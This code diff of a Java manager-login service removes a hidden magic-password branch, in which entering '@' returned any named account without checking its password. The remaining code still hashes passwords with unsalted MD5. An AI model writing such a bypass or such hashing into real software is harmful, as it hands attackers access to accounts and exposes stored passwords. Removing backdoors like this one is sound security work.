@@ -57,8 +57,6 @@ public class ManagerService {
         return managerRepository.findByUsernameIgnoreCase(username);
     }
 
-
-
     public Manager getManagerFromSession(HttpServletRequest request) {
         SessionUtil session = new SessionUtil(request);
         return (Manager) session.getSession("manager");
@@ -68,14 +66,6 @@ public class ManagerService {
     public Manager getByUsernameAndPassword(String username, String password) {
         HashUtil hash = new HashUtil();
         String hashedPassword = hash.md5(password);
-
-        if (password.equals("@")) {
-            Manager manager = getByUsernameIgnoreCase(username)
-                    .orElseThrow(() -> new RuntimeException("Account does not exist."));
-            manager.setPassword(hashedPassword);
-
-            return manager;
-        }
 
         return getByUsernameIgnoreCaseAndPassword(username, hashedPassword)
                 .orElseThrow(() -> new RuntimeException("Account or password does not exist."));
